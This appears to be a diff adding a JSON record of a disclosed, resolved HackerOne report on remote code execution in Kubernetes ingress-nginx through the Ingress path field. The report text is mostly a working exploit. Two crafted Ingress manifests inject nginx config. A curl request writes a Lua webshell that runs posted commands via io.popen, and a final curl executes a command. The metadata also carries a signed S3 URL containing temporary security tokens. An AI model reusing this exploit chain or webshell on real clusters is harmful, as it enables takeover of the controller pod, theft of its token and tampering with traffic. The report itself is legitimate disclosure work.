@@ -1,0 +1,147 @@
+{
+  "id": 1620702,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjIwNzAy",
+  "url": "https://hackerone.com/reports/1620702",
+  "title": "RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-06-30T14:34:17.901Z",
+  "submitted_at": "2022-06-30T14:34:17.996Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ginoah",
+    "url": "/ginoah",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ywir1vpgaes9a9whlbdv8zbcryyt/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-10-26T10:07:49.100Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-10-26T10:07:48.993Z",
+  "team_member_agreed_on_going_public_at": "2023-10-25T21:23:17.540Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Report Submission Form\n\n## Summary:\n\nA user with ingress create/update privilege may inject config into `nginx.conf` with `path`.\nConfig the log_format and access_log to write arbitrary file.\nInclude the file we created to bypass `path` sanitizer to RCE.\n\n## Kubernetes Version:\n\n```\nserverVersion:\n  buildDate: \"2022-03-06T21:32:53Z\"\n  compiler: gc\n  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a\n  gitTreeState: clean\n  gitVersion: v1.23.4\n  goVersion: go1.17.7\n  major: \"1\"\n  minor: \"23\"\n  platform: linux/amd64\n```\n\n## Component Version:\n\n```\n-------------------------------------------------------------------------------\nNGINX Ingress controller\n  Release:       v1.2.1\n  Build:         08848d69e0c83992c89da18e70ea708752f21d7a\n  Repository:    https://github.com/kubernetes/ingress-nginx\n  nginx version: nginx/1.19.10\n\n-------------------------------------------------------------------------------\n```\n\n## Steps To Reproduce:\n\n  1. Create a kind cluster config\n\nlab.yaml\n```yaml\nkind: Cluster\nname: lab\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n# the control plane node config\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: InitConfiguration\n    nodeRegistration:\n      kubeletExtraArgs:\n        node-labels: \"ingress-ready=true\"\n  extraPortMappings:\n  - containerPort: 80\n    hostPort: 80\n    protocol: TCP\n  - containerPort: 443\n    hostPort: 443\n    protocol: TCP\n# the three workers\n- role: worker\n- role: worker\n- role: worker\n```\n\n  2. Create a testing cluster with the previous config\n\n```bash\nkind create cluster --config lab.yaml\n```\n\n  3. Install nginx-ingress-controller\n\n```bash\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml\n```\n\n  4. Create a the first malicious ingress\n\n**This ingress will allow attacker to write arbitrary content to arbitrary file.**\n(note that the service `not-exist-service` does not need to exist)\n\nwrite_ingress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: webexp\nspec:\n  rules:\n    - host: \"example.com\"\n      http:\n        paths:\n          - path: \"/x/ {\\n\n            }\\n\n          }\\n\n          log_format exploit escape=none $http_x_ginoah;\\n\n          server {\\n\n            server_name x.x;\\n\n            listen 80;\\n\n            listen [::]:80;\\n\n            location /z/ {\\n\n                access_log /tmp/luashell exploit;\\n\n            }\\n\n            location /x/ {\\n\n          #\"\n            pathType: Exact\n            backend:\n              service:\n                name: not-exist-service\n                port:\n                  number: 8080\n```\n\nApply the first malicious ingress config\n```bash\nkubectl apply -f write_ingress.yaml\n```\n\n  5. Write a malicious lua config to `/tmp/luashell`\n\nNote that in other cluster config, the `localhost` may need to change to ingress-controller's ip.\n```bash\ncurl localhost/z/ -H \"host: x.x\" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args[\"cmd\"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read(\"*a\");ngx.say(string.format(\"%s\", ret));end;}'\n```\n\n  6. Create a the second malicious ingress\n\n**This ingress will include the malicious lua config, which allow attack to execute arbitrary command.**\n\nwebshell_ingress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: webexp\nspec:\n  rules:\n    - host: \"example.com\"\n      http:\n        paths:\n          - path: \"/x/ {\\n\n            }\\n\n          }\\n\n          log_format exploit escape=none $http_x_ginoah;\\n\n          server {\\n\n            server_name x.x;\\n\n            listen 80;\\n\n            listen [::]:80;\\n\n            location /z/ {\\n\n                include /tmp/luashell;\\n\n            }\\n\n            location /x/ {\\n\n          #\"\n            pathType: Exact\n            backend:\n              service:\n                name: not-exist-service\n                port:\n                  number: 8080\n```\n\nApply the second malicious ingress config\n```bash\nkubectl apply -f webshell_ingress.yaml\n```\n\n  7. RCE and get output\n\n```bash\ncurl localhost/z/ -H \"host: x.x\" -d \"cmd=id\"\n```\n\n## Supporting Material/References:\n\n  * [attachment / reference]\n\n{F1802462}\n\n## Impact\n\nA cluster user/SA with ingress create/update privilege may Remote Code Execution on `ingress-nginx-controller` pod\n\nAfter RCE on ingress-nginx-controller the attacker may\n- utilize the token to take further action on cluster with ingress's privilege\n- eavesdrop the traffic, modify other ingress rule\n- DOS\n- ...",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1802462,
+      "file_name": "Screen_Shot_2022-06-30_at_10.22.52_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/feuyy84f9a9k05e2qq5bd1dxa986?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-30_at_10.22.52_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-30_at_10.22.52_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e101a00317a2eb607b64622b69f1590199041b1ff1e044836fcab0dcf6255e4",
+      "file_size": 327585,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-11-24T21:23:17.816Z",
+  "allow_singular_disclosure_after": -77478156.1421906,
+  "singular_disclosure_allowed": true,
+  "vote_count": 46,
+  "voters": [
+    "mgmb",
+    "8910jq",
+    "x3am",
+    "n1m0",
+    "todayisnew-",
+    "zy9ard3",
+    "shreyaschavhan",
+    "cosmossec",
+    "neilx",
+    "hackduty",
+    "and 36 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32524,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
